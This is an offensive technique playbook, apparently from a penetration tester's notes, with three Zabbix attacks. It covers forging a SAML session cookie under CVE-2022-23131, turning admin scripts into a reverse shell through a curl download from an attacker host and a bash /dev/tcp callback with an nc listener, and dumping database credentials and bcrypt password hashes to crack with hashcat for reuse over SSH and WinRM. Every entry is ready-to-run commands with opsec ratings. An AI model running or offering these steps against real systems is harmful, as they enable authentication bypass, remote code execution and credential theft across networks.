# Zabbix Attack Techniques

### Zabbix SAML SSO Session Token Forgery (CVE-2022-23131) [added: 2026-04]
- **Tags:** #Zabbix #SAML #SessionForgery #AuthBypass #CVE-2022-23131 #WebApp
- **Trigger:** Zabbix login page with "Sign in with Single Sign-On (SAML)" option; version 5.4 or similar detected
- **Prereq:** Zabbix accessible (web); default or known username (e.g., `admin`); ADFS/SSO endpoint reachable (add to /etc/hosts if DNS fails)
- **Yields:** Authenticated Zabbix admin session without knowing the password
- **Opsec:** Med
- **Context:** Zabbix 5.4 SAML implementation doesn't validate the SAML response server-side. The zbx_session cookie contains a base64-encoded JSON with username that can be forged. The PoC generates a valid-looking signed session token for any username.
- **Payload/Method:**
  ```bash
  # Identify version via Help link on login page
  # Add ADFS domain to /etc/hosts if DNS fails:
  echo '<IP> adfs.<domain>' | sudo tee -a /etc/hosts

  # Run the PoC (uncomment debug lines if Login Failed with no output):
  python3 zabbix_session_exp.py -t https://<ZABBIX_IP> -u admin

  # Copy the base64 token from output (eyJ...)
  # In Firefox: DevTools → Storage → Cookies → set zbx_session = <token>
  # Then click "Sign in with Single Sign-On (SAML)"
  ```

### Zabbix Admin Script RCE via Custom Scripts [added: 2026-04]
- **Tags:** #Zabbix #RCE #AdminAbuse #WebApp #ScriptExecution #ReverseShell
- **Trigger:** Admin access to Zabbix; hosts visible in Monitoring → Hosts
- **Prereq:** Zabbix admin session; Zabbix Server or Agent running on target host; outbound connectivity from Zabbix server
- **Yields:** Remote code execution on Zabbix Server or monitored agent hosts
- **Opsec:** Med
- **Context:** Zabbix admin can create and execute arbitrary scripts against any monitored host or the Zabbix Server itself. Use Administration → Scripts → Create Script.
- **Payload/Method:**
  ```bash
  # Attacker: start web server and listener
  echo '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/443 0>&1' > bash.sh
  sudo python3 -m http.server 80
  sudo nc -lvnp 443

  # In Zabbix: Administration → Scripts → Create Script
  # Script 1: curl <ATTACKER_IP>/bash.sh -o /tmp/bash.sh; chmod 777 /tmp/bash.sh
  # Script 2: bash /tmp/bash.sh
  # Execute Type: Script, Scope: Action operation, Required host permissions: Write

  # Monitoring → Hosts → right-click Zabbix Server → run Script 1, then Script 2
  ```

### Zabbix Post-Root DB Credential Extraction + Hash Cracking [added: 2026-04]
- **Tags:** #Zabbix #PostExploit #ConfigFile #DatabaseCredentials #HashCracking #Bcrypt #Hashcat #CredentialHunting #AppConfig #T1552.001
- **Trigger:** Root shell obtained on Zabbix Linux server; need to pivot to other network hosts
- **Prereq:** Root/zabbix user on the Zabbix server; MySQL accessible locally
- **Yields:** DB password for reuse across other services; bcrypt-hashed Zabbix user passwords (Zabbix admin + domain users) — crackable with hashcat -m 3200 to reveal plaintext passwords valid for SSH/WinRM on other hosts
- **Opsec:** Low
- **Context:** Zabbix stores its DB credentials in plaintext in `zabbix_server.conf`. The `users` table contains bcrypt `$2y$` hashes for all Zabbix accounts. Admins who register domain users in Zabbix often reuse the same password for AD accounts. The DB password itself may also be reused on other DB-backed services across the environment.
- **Payload/Method:**
  ```bash
  # Extract DB credentials from config
  cat /usr/local/etc/zabbix_server.conf | grep -E "DBUser|DBPassword|DBName"
  # DBName=zabbix, DBUser=zabbix, DBPassword=<password>

  # Dump user password hashes from DB
  mysql -u zabbix -p<password> zabbix -e "select username,passwd from users;"
  # Hashes are bcrypt ($2y$ prefix)

  # Crack with hashcat (mode 3200 = bcrypt)
  hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

  # Try cracked passwords on SSH/WinRM for all known hosts in environment
  ```
